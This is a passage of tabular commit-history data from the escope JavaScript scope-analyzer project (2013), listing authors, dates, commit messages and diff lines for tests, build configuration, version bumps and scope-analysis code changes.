  ]<\n>+            ]<\n>+        )<\n>+        expect(scopes[0].implicit.variables.map((variable) -> variable.name)).to.be.eql([])<\n>+    it 'assignments global scope without definition'<c> -><\n>+        ast = esprima.parse """"""<\n>+        x = 300;<\n>+        x = 300;<\n>+        """"""<\n>+        scopes = escope.analyze(ast).scopes<\n>+        expect(scopes.map((scope) -><\n>+            scope.variables.map((variable) -><\n>+                variable.defs.map((def) -> def.type)))).to.be.eql(<\n>+            [<\n>+                [<\n>+                ]<\n>+            ]<\n>+        )<\n>+        expect(scopes[0].implicit.variables.map((variable) -> variable.name)).to.be.eql(<\n>+            [<\n>+                'x'<\n>+            ]<\n>+        )<\n>+    it 'assignments global scope without definition eval'<c> -><\n>+        ast = esprima.parse """"""<\n>+        function inner() {<\n>+            eval(str);<\n>+            x = 300;<\n>+        }<\n>+        """"""<\n>+        scopes = escope.analyze(ast).scopes<\n>+        expect(scopes.map((scope) -><\n>+            scope.variables.map((variable) -><\n>+                variable.defs.map((def) -> def.type)))).to.be.eql(<\n>+            [<\n>+                [<\n>+                    [<\n>+                        'FunctionName'<\n>+                    ]<\n>+                ]<\n>+                [<\n>+                    [<\n>+                    ]<\n>+                ]<\n>+            ]<\n>+        )<\n>+        expect(scopes[0].implicit.variables.map((variable) -> variable.name)).to.be.eql([])<\n>+        expect(scopes[0].implicit.variables.map((variable) -> variable.name)).to.be.eql(<\n>+            [<\n>+                'x'<\n>+            ]<\n>+        )<\n>+        expect(scopes[0].implicit.variables.map((variable) -> variable.name)).to.be.eql([])<\n>+        expect(scopes[0].implicit.variables.map((variable) -> variable.name)).to.be.eql(<\n>+            [<\n>+                'x'<\n>+            ]<\n>+        )<\n>+        expect(scopes[0].implicit.variables.map((variable) -> variable.name)).to.be.eql([])<\n>",-        var i<c> iz<c> ref<c> current<c> node;<\n>-                // create an implicit global variable from assignment expression<\n>-                if (ref.__maybeImplicitGlobal) {<\n>-                    node = ref.__maybeImplicitGlobal;<\n>-                    this.__define(node.left<c> {<\n>-                        type: Variable.ImplicitGlobalVariable<c><\n>-                        name: node.left<c><\n>-                        node: node<\n>-                    });<\n>-                    'x'<\n>-                    'x'<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,1,43,17 Aug 2013,Fix styles,0,0,1,2,15,+    }<\n>,-    };<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,1,40,17 Aug 2013,version 0.0.17-dev starts,0,0,2,4,130,"+    exports.version = '0.0.17-dev';<\n>+  ""version"": ""0.0.17-dev""<c><\n>","-    exports.version = '0.0.16-dev';<\n>-  ""version"": ""0.0.16-dev""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,1,38,17 Aug 2013,Add optimisitc option,0,1,1,146,5493,"+        options;<\n>+    function defaultOptions() {<\n>+        return {<\n>+            optimistic: false<c><\n>+            directive: false<\n>+        };<\n>+    };<\n>+    function updateDeeply(target<c> override) {<\n>+        var key<c> val;<\n>+        function isHashObject(target) {<\n>+            return typeof target === 'object' && target instanceof Object && !(target instanceof RegExp);<\n>+        }<\n>+        for (key in override) {<\n>+            if (override.hasOwnProperty(key)) {<\n>+                val = override[key];<\n>+                if (isHashObject(val)) {<\n>+                    if (isHashObject(target[key])) {<\n>+                        updateDeeply(target[key]<c> val);<\n>+                    } else {<\n>+                        target[key] = updateDeeply({}<c> val);<\n>+                    }<\n>+                } else {<\n>+                    target[key] = val;<\n>+                }<\n>+            }<\n>+        }<\n>+        return target;<\n>+    }<\n>+        if (options.directive) {<\n>+        if (!this.dynamic || options.optimistic) {<\n>+                }<\n>+            }<\n>+        }<\n>+        if (this.type === 'global') {<\n>+            for (i = 0<c> iz = this.left.length; i < iz; ++i) {<\n>+                // create an implicit global variable from assignment expression<\n>+                ref = this.left[i];<\n>+                if (ref.__maybeImplicitGlobal) {<\n>+                    node = ref.__maybeImplicitGlobal;<\n>+                    this.__define(node.left<c> {<\n>+                        type: Variable.ImplicitGlobalVariable<c><\n>+                        name: node.left<c><\n>+                        node: node<\n>+                    });<\n>+        if (this.upper) {<\n>+            this.upper.left.push(ref);<\n>+        }<\n>+    function analyze(tree<c> providedOptions) {<\n>+        options = updateDeeply(defaultOptions()<c> providedOptions);<\n>+        options = null;<\n>+# Copyright (C) 2013 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+# Redistribution and use in source and binary forms<c> with or without<\n>+# modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#   * Redistributions of source code must retain the above copyright<\n>+#     notice<c> this list of conditions and the following disclaimer.<\n>+#   * Redistributions in binary form must reproduce the above copyright<\n>+#     notice<c> this list of conditions and the following disclaimer in the<\n>+#     documentation and/or other materials provided with the distribution.<\n>+#<\n>+# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+# AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+# ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+# DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+# (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+# LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+# ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+# THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+'use strict'<\n>+expect = require('chai').expect<\n>+escope = require '..'<\n>+esprima = require 'esprima'<\n>+describe 'optimistic'<c> -><\n>+    it 'direct call to eval'<c> -><\n>+        ast = esprima.parse """"""<\n>+        function outer() {<\n>+            eval(str);<\n>+            var i = 20;<\n>+            function inner() {<\n>+                i;<\n>+            }<\n>+        }<\n>+        """"""<\n>+        scopes = escope.analyze(ast<c> optimistic: yes).scopes<\n>+        expect(scopes.map((scope) -><\n>+            scope.variables.map((variable) -> variable.name))).to.be.eql(<\n>+            [<\n>+                [<\n>+                    'outer'<\n>+                ]<\n>+                [<\n>+                    'arguments'<\n>+                    'i'<\n>+                    'inner'<\n>+                ]<\n>+                [<\n>+                    'arguments'<\n>+                ]<\n>+            ]<\n>+        )<\n>+    it 'with statement'<c> -><\n>+        ast = esprima.parse """"""<\n>+        function outer() {<\n>+            eval(str);<\n>+            var i = 20;<\n>+            with (obj) {<\n>+                i;<\n>+            }<\n>+        }<\n>+        """"""<\n>+        scopes = escope.analyze(ast<c> optimistic: yes).scopes<\n>+        expect(scopes.map((scope) -><\n>+            scope.variables.map((variable) -> variable.name))).to.be.eql(<\n>+            [<\n>+                [<\n>+                    'outer'<\n>+                ]<\n>+                [<\n>+                    'arguments'<\n>+                    'i'<\n>+                ]<\n>+                [<\n>+                ]<\n>+            ]<\n>+        )<\n>","-        directive;<\n>-        if (directive) {<\n>-        if (!this.dynamic) {<\n>-                    // create an implicit global variable from assignment expression<\n>-                    // TODO(Constellation): This is too conservative<c> ""optimistic"" option is needed.<\n>-                    if (this.type === 'global' && ref.__maybeImplicitGlobal) {<\n>-                        node = ref.__maybeImplicitGlobal;<\n>-                        this.__define(node.left<c> {<\n>-                            type: Variable.ImplicitGlobalVariable<c><\n>-                            name: node.left<c><\n>-                            node: node<\n>-                        });<\n>-                    }<\n>-        assert(this.upper<c> 'upper should be here');<\n>-        this.upper.left.push(ref);<\n>-    function analyze(tree<c> options) {<\n>-        options = options || {};<\n>-        directive = options.directive;<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,1,14,17 Aug 2013,version 0.0.16-dev starts,0,0,2,4,130,"+    exports.version = '0.0.16-dev';<\n>+  ""version"": ""0.0.16-dev""<c><\n>","-    exports.version = '0.0.15-dev';<\n>-  ""version"": ""0.0.15-dev""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,0,55,17 Aug 2013,Fix implicit global reference Close #21 #17,0,2,2,221,9446,"+/*<\n>+  Copyright (C) 2013 Yusuke Suzuki <utatane.tea@gmail.com><\n>+  Redistribution and use in source and binary forms<c> with or without<\n>+  modification<c> are permitted provided that the following conditions are met:<\n>+    * Redistributions of source code must retain the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer.<\n>+    * Redistributions in binary form must reproduce the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer in the<\n>+      documentation and/or other materials provided with the distribution.<\n>+  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+*/<\n>+module.exports = function (grunt) {<\n>+    'use strict';<\n>+    grunt.initConfig({<\n>+        jshint: {<\n>+            all: [<\n>+                'Gruntfile.js'<c><\n>+                'escope.js'<\n>+            ]<c><\n>+            options: {<\n>+                jshintrc: '.jshintrc'<c><\n>+                force: false<\n>+            }<\n>+        }<c><\n>+        mochaTest: {<\n>+            test: {<\n>+                options: {<\n>+                    reporter: 'spec'<c><\n>+                    compilers: 'coffee:coffee-script'<\n>+                }<c><\n>+                src: ['test/*.coffee']<\n>+            }<\n>+        }<\n>+    });<\n>+    // load tasks<\n>+    grunt.loadNpmTasks('grunt-contrib-jshint');<\n>+    grunt.loadNpmTasks('grunt-mocha-test');<\n>+    // alias<\n>+    grunt.registerTask('test'<c> 'mochaTest');<\n>+    grunt.registerTask('lint'<c> 'jshint');<\n>+    grunt.registerTask('travis'<c> ['lint'<c> 'test']);<\n>+    grunt.registerTask('default'<c> 'travis');<\n>+/* vim: set sw=4 ts=4 et tw=80 : */<\n>+    function Reference(ident<c> scope<c> flag<c> writeExpr<c> maybeImplicitGlobal) {<\n>+        this.__maybeImplicitGlobal = maybeImplicitGlobal;<\n>+        var i<c> iz<c> ref<c> current<c> node;<\n>+            // this is ""global"" / ""with"" / ""function with eval"" environment<\n>+                    // create an implicit global variable from assignment expression<\n>+                    // TODO(Constellation): This is too conservative<c> ""optimistic"" option is needed.<\n>+                    if (this.type === 'global' && ref.__maybeImplicitGlobal) {<\n>+                        node = ref.__maybeImplicitGlobal;<\n>+                        this.__define(node.left<c> {<\n>+                            type: Variable.ImplicitGlobalVariable<c><\n>+                            name: node.left<c><\n>+                            node: node<\n>+                        });<\n>+                    }<\n>+    Scope.prototype.__referencing = function __referencing(node<c> assign<c> writeExpr<c> maybeImplicitGlobal) {<\n>+            ref = new Reference(node<c> this<c> assign || Reference.READ<c> writeExpr<c> maybeImplicitGlobal);<\n>+        currentScope = null;<\n>+                        currentScope.__referencing(node.left<c> Reference.WRITE<c> node.right<c> (!currentScope.isStrict && node.left.name != null) && node);<\n>+                        currentScope.__referencing(node.left.declarations[0].id<c> Reference.WRITE<c> null<c> false);<\n>+                        currentScope.__referencing(node.left<c> Reference.WRITE<c> null<c> (!currentScope.isStrict && node.left.name != null) && node);<\n>+                            currentScope.__referencing(decl.id<c> Reference.WRITE<c> decl.init<c> false);<\n>+    ""jshint"": ""~1.1.0""<c><\n>+    ""grunt-mocha-test"": ""~0.6.3""<c><\n>+    ""grunt-cli"": ""~0.1.9""<c><\n>+    ""grunt"": ""~0.4.1""<c><\n>+    ""grunt-contrib-jshint"": ""~0.6.3""<c><\n>+    ""coffee-script"": ""~1.6.3""<c><\n>+    ""chai"": ""~1.7.2""<c><\n>+    ""esprima"": ""~1.0.3""<\n>+    ""test"": ""grunt travis""<c><\n>+    ""unit-test"": ""grunt test""<c><\n>+    ""lint"": ""grunt lint""<\n>+# Copyright (C) 2013 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+# Redistribution and use in source and binary forms<c> with or without<\n>+# modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#   * Redistributions of source code must retain the above copyright<\n>+#     notice<c> this list of conditions and the following disclaimer.<\n>+#   * Redistributions in binary form must reproduce the above copyright<\n>+#     notice<c> this list of conditions and the following disclaimer in the<\n>+#     documentation and/or other materials provided with the distribution.<\n>+#<\n>+# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+# AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+# ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+# DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+# (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+# LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+# ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+# THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+'use strict'<\n>+expect = require('chai').expect<\n>+escope = require '..'<\n>+esprima = require 'esprima'<\n>+describe 'implicit global reference'<c> -><\n>+    it 'assignment leaks'<c> -><\n>+        ast = esprima.parse """"""<\n>+        function outer() {<\n>+            x = 20;<\n>+        }<\n>+        """"""<\n>+        scopes = escope.analyze(ast).scopes<\n>+        expect(scopes.map((scope) -><\n>+            scope.variables.map((variable) -> variable.name))).to.be.eql(<\n>+            [<\n>+                [<\n>+                    'outer'<\n>+                    'x'<\n>+                ]<\n>+                [<\n>+                    'arguments'<\n>+                ]<\n>+            ]<\n>+        )<\n>+    it 'assignment doesn\'t leak'<c> -><\n>+        ast = esprima.parse """"""<\n>+        function outer() {<\n>+            function inner() {<\n>+                x = 20;<\n>+            }<\n>+            var x;<\n>+        }<\n>+        """"""<\n>+        scopes = escope.analyze(ast).scopes<\n>+        expect(scopes.map((scope) -><\n>+            scope.variables.map((variable) -> variable.name))).to.be.eql(<\n>+            [<\n>+                [<\n>+                    'outer'<\n>+                ]<\n>+                [<\n>+                    'arguments'<\n>+                    'inner'<\n>+                    'x'<\n>+                ]<\n>+                [<\n>+                    'arguments'<\n>+                ]<\n>+            ]<\n>+        )<\n>+    it 'for-in-statement leaks'<c> -><\n>+        ast = esprima.parse """"""<\n>+        function outer() {<\n>+            for (x in y) { }<\n>+        }<\n>+        """"""<\n>+        scopes = escope.analyze(ast).scopes<\n>+        expect(scopes.map((scope) -><\n>+            scope.variables.map((variable) -> variable.name))).to.be.eql(<\n>+            [<\n>+                [<\n>+                    'outer'<\n>+                    'x'<\n>+                ]<\n>+                [<\n>+                    'arguments'<\n>+                ]<\n>+            ]<\n>+        )<\n>+    it 'for-in-statement doesn\'t leaks'<c> -><\n>+        ast = esprima.parse """"""<\n>+        function outer() {<\n>+            function inner() {<\n>+                for (x in y) { }<\n>+            }<\n>+            var x;<\n>+        }<\n>+        """"""<\n>+        scopes = escope.analyze(ast).scopes<\n>+        expect(scopes.map((scope) -><\n>+            scope.variables.map((variable) -> variable.name))).to.be.eql(<\n>+            [<\n>+                [<\n>+                    'outer'<\n>+                ]<\n>+                [<\n>+                    'arguments'<\n>+                    'inner'<\n>+                    'x'<\n>+                ]<\n>+                [<\n>+                    'arguments'<\n>+                ]<\n>+            ]<\n>+        )<\n>","-    function Reference(ident<c> scope<c> flag<c> writeExpr) {<\n>-        var i<c> iz<c> ref<c> current;<\n>-            // this is global / with / function with eval environment<\n>-    Scope.prototype.__referencing = function __referencing(node<c> assign<c> writeExpr) {<\n>-            ref = new Reference(node<c> this<c> assign || Reference.READ<c> writeExpr);<\n>-        currentScope = null<c><\n>-                    //check for implicit global variable declaration<\n>-                    if (!currentScope.isStrict && node.left.name && !currentScope.isUsedName(node.left.name) && node.operator === '=') {<\n>-                        //create an implicit global variable from assignment expression<\n>-                        globalScope.__define(node.left<c> {<\n>-                            type: Variable.ImplicitGlobalVariable<c><\n>-                            name: node.left<c><\n>-                            node: node<\n>-                        });<\n>-                    }<\n>-                        currentScope.__referencing(node.left<c> Reference.WRITE<c> node.right);<\n>-                        currentScope.__referencing(node.left.declarations[0].id<c> Reference.WRITE<c> null);<\n>-                        currentScope.__referencing(node.left<c> Reference.WRITE<c> null);<\n>-                            currentScope.__referencing(decl.id<c> Reference.WRITE<c> decl.init);<\n>-    ""jshint"": ""~1.1.0""<\n>-    ""test"": ""./node_modules/.bin/jshint escope.js""<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,18,38,29 Jul 2013,Fix for JSHint style,0,0,1,6,172,+        if (currentScope) {<\n>+            currentScope.childScopes.push(this);<\n>+        }<\n>,-        <\n>-        currentScope && currentScope.childScopes.push(this);<\n>-        <\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,2,22,29 Jul 2013,Merge pull request #20 from Mindonaut/master Adding child Scopes array,0,0,0,0,0,,,F
17,56,56,569,4,26,Jorge C,30,2,13,5,User,0,3071,Wed,16,53,17 Jul 2013,Adding child Scopes array Adding array with a list of the inner scopes belonging to a scope (having it as an upper scope). This allows for easy hierarchical traversing of scopes.,0,0,1,4,114,+        <\n>+        this.childScopes = [];<\n>+        currentScope && currentScope.childScopes.push(this);<\n>+        <\n>,,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,21,35,1 Jul 2013,Merge pull request #18 from meteor/master Implement ignoreEval option to analyze. Fixes #2.,0,0,0,0,0,,,F
17,56,56,569,4,26,David Glasser,119,29,388,1,User,1,4025,Mon,20,43,1 Jul 2013,Implement ignoreEval option to analyze. Fixes #2.,0,0,1,5,344,+        options = options || {};<\n>+        directive = options.directive;<\n>+                    if (!options.ignoreEval && node.callee.type === Syntax.Identifier && node.callee.name === 'eval') {<\n>,-        directive = options && options.directive;<\n>-                    if (node.callee.type === Syntax.Identifier && node.callee.name === 'eval') {<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,5,22,5 May 2013,Add tools and demos to README ref #14,0,0,1,9,900,+### Demos and Tools<\n>+Demonstration is [here](http://mazurov.github.io/escope-demo/) by [Sasha Mazurov](https://github.com/mazurov) (twitter: [@mazurov](http://twitter.com/mazurov)). [issue](https://github.com/Constellation/escope/issues/14)<\n>+![Demo](https://f.cloud.github.com/assets/75759/462920/7aa6dd40-b4f5-11e2-9f07-9f4e8d0415f9.gif)<\n>+And there are tools constructed on Escope.<\n>+- [Esmangle](https://github.com/Constellation/esmangle) is a minifier / mangler / optimizer.<\n>+- [Eslevels](https://github.com/mazurov/eslevels) is a scope levels analyzer and [SublimeText plugin for scope context coloring](https://github.com/mazurov/sublime-levels) is constructed on it.<\n>+- [Estoggles](https://github.com/keeyipchan/esgoggles) is JavaScript code browser.<\n>+Copyright (C) 2012-2013 [Yusuke Suzuki](http://github.com/Constellation)<\n>,-Copyright (C) 2012 [Yusuke Suzuki](http://github.com/Constellation)<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,3,57,5 May 2013,Add build status image,0,0,1,1,125,+[![Build Status](https://travis-ci.org/Constellation/escope.png?branch=master)](https://travis-ci.org/Constellation/escope)<\n>,,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,3,57,5 May 2013,Remove mocha and chai,0,0,1,4,170,"+    ""test"": ""./node_modules/.bin/jshint escope.js""<\n>","-    ""mocha"": ""*""<c><\n>-    ""chai"": ""*""<c><\n>-    ""test"": ""./node_modules/.bin/jshint escope.js && ./node_modules/.bin/mocha""<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,3,55,5 May 2013,Add travis CI hook,0,1,1,4,49,+language: node_js<\n>+node_js:<\n>+  - 0.10<\n>+  - 0.11<\n>,,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,3,53,5 May 2013,version 0.0.15-dev starts,0,0,2,4,130,"+    exports.version = '0.0.15-dev';<\n>+  ""version"": ""0.0.15-dev""<c><\n>","-    exports.version = '0.0.14-dev';<\n>-  ""version"": ""0.0.14-dev""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,3,50,5 May 2013,Cleanup global resources,0,0,1,6,207,+        var resultScopes;<\n>+        resultScopes = scopes = [];<\n>+        globalScope = null;<\n>+        scopes = null;<\n>+        return new ScopeManager(resultScopes);<\n>,-        return new ScopeManager(scopes);<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,3,49,5 May 2013,More precise strict code assertion,0,0,1,61,2246,"+        scopes<c><\n>+        directive;<\n>+    function isStrictScope(scope<c> block) {<\n>+        var body<c> i<c> iz<c> stmt<c> expr;<\n>+        // When upper scope is exists and strict<c> inner scope is also strict.<\n>+        if (scope.upper && scope.upper.isStrict) {<\n>+            return true;<\n>+        }<\n>+        if (scope.type === 'function') {<\n>+            body = block.body;<\n>+        } else if (scope.type === 'global') {<\n>+            body = block;<\n>+        } else {<\n>+            return false;<\n>+        }<\n>+        if (directive) {<\n>+            for (i = 0<c> iz = body.body.length; i < iz; ++i) {<\n>+                stmt = body.body[i];<\n>+                if (stmt.type !== 'DirectiveStatement') {<\n>+                    break;<\n>+                }<\n>+                if (stmt.raw === '""use strict""' || stmt.raw === '\'use strict\'') {<\n>+                    return true;<\n>+                }<\n>+            }<\n>+        } else {<\n>+            for (i = 0<c> iz = body.body.length; i < iz; ++i) {<\n>+                stmt = body.body[i];<\n>+                if (stmt.type !== Syntax.ExpressionStatement) {<\n>+                    break;<\n>+                }<\n>+                expr = stmt.expression;<\n>+                if (expr.type !== Syntax.Literal || typeof expr.value !== 'string') {<\n>+                    break;<\n>+                }<\n>+                if (expr.raw != null) {<\n>+                    if (expr.raw === '""use strict""' || expr.raw === '\'use strict\'') {<\n>+                        return true;<\n>+                    }<\n>+                } else {<\n>+                    if (expr.value === 'use strict') {<\n>+                        return true;<\n>+                    }<\n>+                }<\n>+            }<\n>+        }<\n>+        return false;<\n>+    }<\n>+        this.isStrict = isStrictScope(this<c> block);<\n>+        // RAII<\n>+    function analyze(tree<c> options) {<\n>+        directive = options && options.directive;<\n>",-        scopes;<\n>-        this.isStrict =<\n>-                    ((this.type === 'global' || this.type === 'function') &&<\n>-                    body.body[0].type === 'ExpressionStatement' &&<\n>-                    body.body[0].expression.type === 'Literal' &&<\n>-                    body.body[0].expression.value === 'use strict');<\n>-        // RAII<\n>-    function analyze(tree) {<\n>-        scopes = [];<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,3,31,5 May 2013,Make JSHint clean,0,1,2,106,3094,"+    ""curly"": true<c><\n>+    ""eqeqeq"": true<c><\n>+    ""immed"": true<c><\n>+    ""indent"": 4<c><\n>+    ""eqnull"": true<c><\n>+    ""latedef"": true<c><\n>+    ""noarg"": true<c><\n>+    ""noempty"": true<c><\n>+    ""quotmark"": ""single""<c><\n>+    ""undef"": true<c><\n>+    ""unused"": true<c><\n>+    ""strict"": true<c><\n>+    ""trailing"": true<c><\n>+    ""white"": true<c><\n>+    ""onevar"": true<c><\n>+    ""node"": true<\n>+/*global exports:true<c> define:true<c> require:true*/<\n>+    var Syntax<c><\n>+        var variable<c> body;<\n>+        this.set = new Map();<\n>+        this.taints = new Map();<\n>+        var i<c> iz<c> ref<c> current;<\n>+        var variable<c> name;<\n>+        assert(this.__isClosed()<c> 'scope should be closed');<\n>+        assert(ident.type === Syntax.Identifier<c> 'target should be identifier');<\n>+    Scope.prototype.isUsedName = function (name) {<\n>+        if (this.set.has(name)) {<\n>+            enter: function enter(node) {<\n>+  ""name"": ""escope""<c><\n>+  ""description"": ""ECMAScript scope analyzer""<c><\n>+  ""homepage"": ""http://github.com/Constellation/escope.html""<c><\n>+  ""main"": ""escope.js""<c><\n>+  ""version"": ""0.0.14-dev""<c><\n>+  ""engines"": {<\n>+    ""node"": "">=0.4.0""<\n>+  }<c><\n>+  ""maintainers"": [<\n>+    {<\n>+      ""name"": ""Yusuke Suzuki""<c><\n>+      ""email"": ""utatane.tea@gmail.com""<c><\n>+      ""web"": ""http://github.com/Constellation""<\n>+  ]<c><\n>+  ""repository"": {<\n>+    ""type"": ""git""<c><\n>+    ""url"": ""http://github.com/Constellation/escope.git""<\n>+  }<c><\n>+  ""dependencies"": {<\n>+    ""estraverse"": "">= 0.0.2""<\n>+  }<c><\n>+  ""devDependencies"": {<\n>+    ""mocha"": ""*""<c><\n>+    ""chai"": ""*""<c><\n>+    ""jshint"": ""~1.1.0""<\n>+  }<c><\n>+  ""licenses"": [<\n>+    {<\n>+      ""type"": ""BSD""<c><\n>+      ""url"": ""http://github.com/Constellation/escope/raw/master/LICENSE.BSD""<\n>+    }<\n>+  ]<c><\n>+  ""scripts"": {<\n>+    ""test"": ""./node_modules/.bin/jshint escope.js && ./node_modules/.bin/mocha""<\n>+  }<\n>","-/*global escope:true<c> exports:true<c> define:true*/<\n>-    var estraverse<c><\n>-        Syntax<c><\n>-        var variable<c>body;<\n>-        this.set = new Map;<\n>-        this.taints = new Map;<\n>-        var i<c> iz<c> ref<c> set<c> current;<\n>-        var i<c> iz<c> variable<c> name;<\n>-        assert(this.__isClosed()<c> ""scope should be closed"");<\n>-        assert(ident.type === Syntax.Identifier<c> ""target should be identifier"");<\n>-    Scope.prototype.isUsedName = function(name){<\n>-        if(this.set.has(name)) {<\n>-            enter: function enter(node<c> parent) {<\n>-    ""name"": ""escope""<c><\n>-    ""description"": ""ECMAScript scope analyzer""<c><\n>-    ""homepage"": ""http://github.com/Constellation/escope.html""<c><\n>-    ""main"": ""escope.js""<c><\n>-    ""version"": ""0.0.14-dev""<c><\n>-    ""engines"": {<\n>-        ""node"": "">=0.4.0""<\n>-    }<c><\n>-    ""maintainers"": [{<\n>-        ""name"": ""Yusuke Suzuki""<c><\n>-        ""email"": ""utatane.tea@gmail.com""<c><\n>-        ""web"": ""http://github.com/Constellation""<\n>-    }]<c><\n>-    ""repository"": {<\n>-        ""type"": ""git""<c><\n>-        ""url"": ""http://github.com/Constellation/escope.git""<\n>-    }<c><\n>-    ""dependencies"": {<\n>-        ""estraverse"": "">= 0.0.2""<\n>-    }<c><\n>-    ""devDependencies"": {<\n>-        ""mocha"": ""*""<c><\n>-        ""chai"": ""*""<\n>-    }<c><\n>-    ""licenses"": [{<\n>-        ""type"": ""BSD""<c><\n>-        ""url"": ""http://github.com/Constellation/escope/raw/master/LICENSE.BSD""<\n>-    }]<c><\n>-    ""scripts"": {<\n>-        ""test"": ""./node_modules/.bin/mocha""<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,3,27,5 May 2013,Add copyright line,0,0,1,3,186,+  Copyright (C) 2012-2013 Yusuke Suzuki <utatane.tea@gmail.com><\n>+  Copyright (C) 2013 Alex Seville <hi@alexanderseville.com><\n>,-  Copyright (C) 2012 Yusuke Suzuki <utatane.tea@gmail.com><\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,3,23,5 May 2013,Merge branch master of https://github.com/alex-seville/escope into alex-seville-master Conflicts: escope.js,0,0,1,10,478,+             globalScope = this;<\n>+         }<\n>+                     //check for implicit global variable declaration<\n>+                         //create an implicit global variable from assignment expression<\n>+                         globalScope.__define(node.left<c> {<\n>+                             type: Variable.ImplicitGlobalVariable<c><\n>+                             name: node.left<c><\n>+                             node: node<\n>+                         });<\n>+                     }<\n>,,F
